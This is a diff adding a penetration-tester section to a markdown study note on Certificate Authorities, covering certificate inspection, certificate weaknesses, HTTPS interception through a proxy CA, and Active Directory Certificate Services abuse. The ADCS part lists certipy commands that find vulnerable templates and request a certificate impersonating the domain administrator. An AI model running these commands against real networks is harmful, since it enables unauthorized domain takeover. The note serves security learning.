@@ -26,3 +26,46 @@ Trusting a Certificate Authority is crucial for the security of online communica
 There are several well-known CAs like Let's Encrypt, DigiCert, and Comodo. These organizations follow strict security practices to ensure the integrity of the certificates they issue.
 
 In summary, a Certificate Authority is a digital guardian that helps verify the identities of entities on the internet, securing your online activities by ensuring that the websites you visit are who they claim to be and that your data is transmitted securely.
+
+---
+
+## CAs from a pentester's view
+
+Certificates and CAs come up in two contexts: assessing a target's certs and abusing CA/certificate trust to attack.
+
+### Inspecting certificates
+
+```bash
+# Pull and read a server certificate
+openssl s_client -connect target.com:443 -servername target.com < /dev/null 2>/dev/null | openssl x509 -noout -text
+
+# Certificate Transparency logs are a recon goldmine (finds subdomains)
+curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
+```
+
+### Certificate-related findings
+
+- **Self-signed / untrusted CA** — no real identity assurance; enables MITM.
+- **Expired or wrong-hostname certs** — trust warnings users are trained to click through.
+- **Weak signature (SHA-1)** or small key — forgeable.
+- **Wildcard/private keys leaked** — anyone with the key can impersonate the site.
+
+### Interception via your own CA
+
+Burp/ZAP work by acting as a CA: you install their root cert on the client so they can sign certs on the fly and decrypt HTTPS. If a client validates the chain strictly or pins certs, you must bypass pinning.
+
+### AD Certificate Services (ADCS) — a hot enterprise target
+
+In Windows environments, a misconfigured internal CA (ADCS) can lead straight to domain admin (ESC1–ESC8 techniques):
+
+```bash
+# Enumerate vulnerable certificate templates
+certipy find -u user@domain -p 'Password' -dc-ip 10.0.0.1 -vulnerable
+# Abuse a misconfigured template to impersonate an admin
+certipy req -u user@domain -p 'Password' -ca CA-NAME -template VulnTemplate -upn administrator@domain
+```
+
+## Related
+
+- [PKI](Public%20Key%20Infrastructure%20(PKI).md) · [SSL Handshake](SSL%20Handshake.md)
+- [Active Directory Basics](../Active%20Directory/Active%20Directory%20Basics.md)
